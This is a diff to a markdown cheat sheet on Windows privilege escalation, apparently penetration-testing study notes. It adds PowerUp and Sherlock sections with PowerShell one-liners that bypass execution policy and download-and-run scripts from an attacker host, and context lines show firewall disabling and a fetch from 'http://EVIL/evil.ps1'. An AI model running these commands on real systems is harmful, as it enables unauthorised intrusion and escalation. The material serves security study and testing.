@@ -13,6 +13,7 @@
 * [Bypassing AV](#Bypassing-AV)
 * [Powershell](#Powershell)
 * [Automated Tools](#Automated-Tools)
+* [Manual Enumeration Walk Through](#Manual-Enumeration-Walk-Through)
 * [Resources](#Resources)
 * [Nothing is working --> SOS](#nothing-is-working----sos)
 
@@ -98,6 +99,12 @@ netsh firewall set service remotedesktop enable
 ```
 $ netsh firewall set opmode disable
 ```
+* Powershell
+```
+powershell
+
+powershell -ExecutionPolicy ByPass -command "& { . whoami }"
+```
 
 [Back](#summary)
 
@@ -165,18 +172,8 @@ echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | pow
 [Back](#summary)
 
 ## Process
-- powershell
-```
-powershell
-
-powershell -ExecutionPolicy ByPass -command "& { . whoami }"
-```
 - systeminfo
 	* Gives us system info 
-	* [Offline - Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
-	```
-	python ~/Desktop/Scripts/WindowsPrivEsc/windows-exploit-suggester.py --database ~/Desktop/Scripts/WindowsPrivEsc/2019-08-19-mssb.xls --systeminfo priv-esc/systeminfo.txt
-	```
 	* Check Hot Fixes
 		* No hot fixes - means no hotfixes installed OR we don't have permissions to view hot fixes
 	* Check OS Name
@@ -487,9 +484,41 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat
 Powerless.bat
 ```
-* [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+* [Offline - Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+```
+python ~/Desktop/Scripts/WindowsPrivEsc/windows-exploit-suggester.py --database ~/Desktop/Scripts/WindowsPrivEsc/2019-08-19-mssb.xls --systeminfo priv-esc/systeminfo.txt
+```
 * [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
-* [Sherlock](https://github.com/rasta-mouse/Sherlock)
+```
+windows-privesc-check2.exe --dump -a > dump.txt
+```
+* [Powershell - Sherlock](https://github.com/rasta-mouse/Sherlock)
+```
+Sherlock.ps1
+grep -i function Sherlock.ps1
+Find-AllVulns
+at the end append: Find-AllVulns
+```
+* [Powershell - Power Up](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+One-liners to download the script and run it directly
+```
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"
+
+powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"
+
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"
+```
+If ps1 file is downloaded, run these commands
+```
+powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+```
+[Back](#summary)
+
+## Manual Enumeration Walk Through
+* [Fuzzy Security](http://www.fuzzysecurity.com/tutorials/16.html)
+* [Hacking and Security](http://hackingandsecurity.blogspot.in/2017/09/oscp-windows-priviledge-escalation.html)
+* [Sushant](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
 
 [Back](#summary)
 
